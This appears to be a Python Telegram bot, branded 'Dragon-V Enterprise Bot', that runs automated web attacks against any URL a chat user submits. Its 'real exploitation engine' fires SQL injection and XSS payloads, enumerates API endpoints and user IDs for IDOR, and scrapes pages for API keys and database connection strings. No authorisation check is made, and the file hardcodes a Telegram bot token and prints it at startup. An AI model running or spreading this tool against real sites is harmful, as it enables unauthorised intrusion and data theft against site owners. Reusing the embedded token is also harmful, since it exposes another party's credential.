#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Bot #1 - Working Version with Better Startup Detection
"""

import sys
import asyncio
import json
import time
from datetime import datetime

if sys.stdout.encoding != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from telegram.constants import ParseMode

import requests
import re
from urllib.parse import urljoin

TOKEN = "8314772330:AAHOEYCPAY5WL99orpwwETrbykwFwBG6Jkw"

class RealExploitationEngine:
    """真实漏洞利用引擎"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        })
        self.vulnerabilities = []
    
    def test_sql_injection(self):
        """测试 SQL 注入"""
        test_payloads = [
            ("' OR '1'='1", "Boolean-based SQLi"),
            ("' OR 1=1--", "Comment-based SQLi"),
            ("1' AND SLEEP(5)--", "Time-based blind SQLi"),
            ("' UNION SELECT NULL--", "Union-based SQLi")
        ]
        
        test_urls = [
            f"{self.target_url}/?id=1",
            f"{self.target_url}/search?q=test",
            f"{self.target_url}/api/users/1",
        ]
        
        for url in test_urls:
            for payload, technique in test_payloads:
                try:
                    test_url = url.replace("1", payload).replace("test", payload)
                    response = self.session.get(test_url, timeout=5)
                    
                    sql_indicators = ['sql', 'syntax', 'mysql', 'database', 'postgresql', 'error in your sql']
                    
                    if any(keyword in response.text.lower() for keyword in sql_indicators):
                        self.vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "CRITICAL",
                            "endpoint": url,
                            "technique": technique,
                            "payload": payload,
                            "confirmed": True,
                            "response_length": len(response.text)
                        })
                        return True
                except:
                    pass
        
        return False
    
    def test_xss(self):
        """测试 XSS"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "'\"><script>alert('xss')</script>",
            "<svg onload=alert('xss')>"
        ]
        
        test_urls = [
            f"{self.target_url}/search?q=",
            f"{self.target_url}/comment?msg=",
            f"{self.target_url}/api/search?query="
        ]
        
        for url in test_urls:
            for payload in xss_payloads:
                try:
                    test_url = url + payload
                    response = self.session.get(test_url, timeout=5)
                    
                    if payload in response.text:
                        self.vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "HIGH",
                            "endpoint": url,
                            "payload": payload,
                            "confirmed": True,
                            "reflected": True
                        })
                        return True
                except:
                    pass
        
        return False
    
    def test_api_exposure(self):
        """测试 API 端点泄露"""
        api_endpoints = [
            f"{self.target_url}/api/users",
            f"{self.target_url}/api/customers",
            f"{self.target_url}/api/admin",
            f"{self.target_url}/api/config",
            f"{self.target_url}/api/settings"
        ]
        
        for endpoint in api_endpoints:
            try:
                response = self.session.get(endpoint, timeout=5)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        self.vulnerabilities.append({
                            "type": "API Information Disclosure",
                            "severity": "HIGH",
                            "endpoint": endpoint,
                            "status_code": 200,
                            "data_type": type(data).__name__,
                            "sample": str(data)[:100] if data else "Empty"
                        })
                        return True
                    except:
                        pass
            except:
                pass
        
        return False
    
    def test_idor(self):
        """测试 IDOR"""
        for user_id in range(1, 10):
            try:
                url = f"{self.target_url}/api/users/{user_id}"
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200 and len(response.text) > 50:
                    self.vulnerabilities.append({
                        "type": "Insecure Direct Object References (IDOR)",
                        "severity": "HIGH",
                        "endpoint": url,
                        "accessible_user_id": user_id,
                        "response_length": len(response.text)
                    })
                    return True
            except:
                pass
        
        return False
    
    def extract_sensitive_data(self):
        """提取敏感数据"""
        try:
            response = self.session.get(self.target_url, timeout=5)
            html = response.text
            
            api_keys = re.findall(r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]+)["\']', html, re.IGNORECASE)
            if api_keys:
                self.vulnerabilities.append({
                    "type": "Sensitive Data Exposure",
                    "severity": "CRITICAL",
                    "data_type": "API Keys",
                    "count": len(api_keys)
                })
            
            db_strings = re.findall(r'(mysql|postgres|mongodb)://[^\s"\']+', html)
            if db_strings:
                self.vulnerabilities.append({
                    "type": "Sensitive Data Exposure",
                    "severity": "CRITICAL",
                    "data_type": "Database Credentials",
                    "count": len(db_strings)
                })
        
        except:
            pass
        
        return len(self.vulnerabilities) > 0

class EnterpriseBot:
    """企业级 Bot"""
    
    def __init__(self):
        self.scan_lock = asyncio.Lock()
        self.is_scanning = False
    
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """主菜单"""
        menu_text = (
            "<b>🛡️ Dragon-V Enterprise Bot #1</b>\n\n"
            "<b>📊 功能:</b>\n"
            "✅ 真实漏洞扫描\n"
            "✅ 漏洞利用测试\n"
            "✅ 数据提取\n"
            "✅ 完整报告\n\n"
            "<b>📝 使用方法:</b>\n"
            "点击按钮或输入 URL 开始扫描"
        )
        
        keyboard = [
            [InlineKeyboardButton("🔍 完整扫描", callback_data="full_scan")],
            [InlineKeyboardButton("💥 漏洞利用", callback_data="exploit")],
            [InlineKeyboardButton("📄 生成报告", callback_data="report")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(menu_text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """处理按钮"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "full_scan":
            await query.edit_message_text(
                "<b>🔍 完整扫描</b>\n\n"
                "请输入要扫描的 URL:\n"
                "<code>https://example.com</code>",
                parse_mode=ParseMode.HTML
            )
            context.user_data['mode'] = 'full_scan'
        
        elif query.data == "exploit":
            await query.edit_message_text(
                "<b>💥 漏洞利用</b>\n\n"
                "请输入目标 URL:\n"
                "<code>https://example.com</code>",
                parse_mode=ParseMode.HTML
            )
            context.user_data['mode'] = 'exploit'
        
        elif query.data == "report":
            await query.edit_message_text(
                "<b>📄 报告格式</b>\n\n"
                "请输入 URL 生成报告:\n"
                "<code>https://example.com</code>",
                parse_mode=ParseMode.HTML
            )
            context.user_data['mode'] = 'report'
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """处理消息"""
        text = update.message.text.strip()
        
        if not text.startswith(('http://', 'https://')):
            text = 'https://' + text
        
        mode = context.user_data.get('mode', 'full_scan')
        
        async with self.scan_lock:
            self.is_scanning = True
            try:
                msg = await update.message.reply_text(
                    f"<b>🔍 扫描中...</b>\n"
                    f"目标: <code>{text}</code>\n"
                    f"进度: [██░░░░░░░░] 20%",
                    parse_mode=ParseMode.HTML
                )
                
                engine = RealExploitationEngine(text)
                engine.test_sql_injection()
                engine.test_xss()
                engine.test_api_exposure()
                engine.test_idor()
                engine.extract_sensitive_data()
                
                await asyncio.sleep(2)
                
                if mode == 'full_scan' or mode == 'report':
                    report = self._generate_report(text, engine.vulnerabilities)
                    
                    await msg.edit_text(
                        report,
                        parse_mode=ParseMode.HTML
                    )
                    
                    json_report = self._generate_json_report(text, engine.vulnerabilities)
                    report_file = f"scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    with open(report_file, 'w', encoding='utf-8') as f:
                        json.dump(json_report, f, indent=2, ensure_ascii=False)
                    
                    await update.message.reply_document(
                        open(report_file, 'rb'),
                        caption="📄 JSON 扫描报告"
                    )
            
            finally:
                self.is_scanning = False
    
    def _generate_report(self, url: str, vulns: list) -> str:
        """生成 HTML 格式报告"""
        report = (
            "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
            "<b>🔍 企业级漏洞扫描报告</b>\n"
            "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
            f"<b>目标:</b> <code>{url}</code>\n"
            f"<b>时间:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        )
        
        if vulns:
            report += f"<b>🔴 发现漏洞: {len(vulns)} 个</b>\n\n"
            
            critical = [v for v in vulns if v.get('severity') == 'CRITICAL']
            high = [v for v in vulns if v.get('severity') == 'HIGH']
            
            if critical:
                report += f"<b>🔴 严重 ({len(critical)}):</b>\n"
                for v in critical:
                    report += f"  • {v['type']}\n"
            
            if high:
                report += f"\n<b>🟠 高 ({len(high)}):</b>\n"
                for v in high:
                    report += f"  • {v['type']}\n"
            
            report += (
                "\n<b>详细信息:</b>\n"
                f"• 可确认漏洞: {sum(1 for v in vulns if v.get('confirmed'))}\n"
                f"• 数据泄露点: {sum(1 for v in vulns if 'Disclosure' in v['type'])}\n"
                f"• 访问控制问题: {sum(1 for v in vulns if 'IDOR' in v['type'])}\n\n"
                "<b>🎯 建议:</b>\n"
                "• 立即修复所有严重漏洞\n"
                "• 进行代码审计\n"
                "• 实施 WAF 保护"
            )
        else:
            report += "<b>✅ 未发现漏洞</b>"
        
        return report
    
    def _generate_json_report(self, url: str, vulns: list) -> dict:
        """生成 JSON 格式报告"""
        return {
            "scan_info": {
                "target": url,
                "timestamp": datetime.now().isoformat(),
                "total_vulnerabilities": len(vulns)
            },
            "vulnerabilities": vulns,
            "summary": {
                "critical": len([v for v in vulns if v.get('severity') == 'CRITICAL']),
                "high": len([v for v in vulns if v.get('severity') == 'HIGH']),
                "medium": len([v for v in vulns if v.get('severity') == 'MEDIUM'])
            }
        }

# ========================= MAIN =========================

print("\n" + "="*70)
print("DRAGON-V ENTERPRISE BOT #1")
print("="*70)
print("\n[*] Bot #1 Initialization")
print("[*] Token: 8314772330:AAHOEYCPAY5WL99orpwwETrbykwFwBG6Jkw")
print("[*] Handle: @ntp_nezhabot\n")

# Create bot instance
bot = EnterpriseBot()

# Create application
print("[*] Creating Telegram application...")
app = Application.builder().token(TOKEN).build()

# Add handlers
print("[*] Registering handlers...")
app.add_handler(CommandHandler("start", bot.start))
app.add_handler(CallbackQueryHandler(bot.button_callback))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))

print("[*] Starting polling...\n")
print("="*70)
print("[+] BOT #1 IS NOW ONLINE AND RUNNING")
print("="*70)
print("\n[*] Waiting for messages...")
print("[*] To test: send /start in @ntp_nezhabot\n")

try:
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
except KeyboardInterrupt:
    print("\n[*] Bot #1 shutting down...")
except Exception as e:
    print(f"\n[-] Bot #1 Error: {e}")
